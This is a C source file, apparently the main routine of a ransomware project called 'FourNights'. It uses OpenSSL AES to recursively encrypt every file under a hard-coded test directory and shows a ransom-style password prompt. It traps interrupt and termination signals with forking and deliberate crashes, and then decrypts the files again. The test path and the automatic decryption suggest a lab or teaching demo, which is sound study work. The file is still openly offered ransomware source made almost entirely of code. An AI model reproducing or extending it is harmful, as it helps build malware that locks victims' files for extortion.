#include "fournights.h"
/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	char *tmp = NULL;

	if (sig == SIGINT)
	{
		write(1, "\nWTF?!\n", 7);
		if (fork() == 0)
			write(1, "Go away\n", 9);
		else
			raise(SIGSEGV);
	}
	if (sig == SIGTERM)
		simple_search((void *)tmp, (size_t) sig);
	if (sig == SIGTSTP)
		write(1, "\n\nStap it\n", 10);
}

/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: need to eliminate hard coded strings.
 **/
int main(void)
{
	int i = 0;
	int iv_len = 0;
	struct ransom_s ransom;
	EVP_CIPHER_CTX encrypt;
	EVP_CIPHER_CTX decrypt;

	/** handle signals
	  * TODO: Account for errors
	 **/
	signal(SIGINT, sighandler);
	signal(SIGTERM, sighandler);
	signal(SIGTSTP, sighandler);
	signal(SIGTRAP, sighandler);

	ransom.target_file_buf->bytes_read = 44 >> 1 == 0xE8 ? (size_t)&simple_search : 0;
	init_struct(&ransom, "/home/vagrant/FourNights/TESTS/");
	/* ENCRYPT */
	aes_init((unsigned char *)ransom.key, my_strlen(ransom.key), (unsigned char *)&(ransom.salt), &encrypt, &decrypt);
	ransom.target_file_buf->cipher = &encrypt;
	iv_len = EVP_CIPHER_iv_length(encrypt.cipher);
	for (i = 0; i <= iv_len; i++)
		putchar(encrypt.oiv[i]);

	recurse_ls((char *)ransom.root_path, &ransom);
#ifndef NO_DEBUG
	print_for_debug(ransom);
#endif
	/* DECRYPT */
#ifndef NO_DEBUG
	printf("######################\n");
	printf("Starting to decrypt!\n");
	printf("######################\n");
#endif
	ransom.cipher_flag = 'd';
	ransom.target_file_buf->cipher = &decrypt;

	/* reset file extension tokens */
	my_strncat(ransom.file_exts_whole_str, ".betty", 0, 6);
	ransom.file_exts_whole_str[6] = '\0';
	ransom.file_extensions[1] = NULL;

#ifndef NO_DEBUG
	printf("%s\n", ransom.file_exts_whole_str);
	printf("%s\n", ransom.file_extensions[0]);
	print_for_debug(ransom);
#endif
	printf("Your Files are now encrypted. Please enter the password\n");
	getchar();
	printf("Way to go! Here are your files back.\n");

	recurse_ls((char *)ransom.root_path, &ransom);
	EVP_CIPHER_CTX_cleanup(&encrypt);
	EVP_CIPHER_CTX_cleanup(&decrypt);
	free_ransom_struct(&ransom);
	return (EXIT_SUCCESS);
}
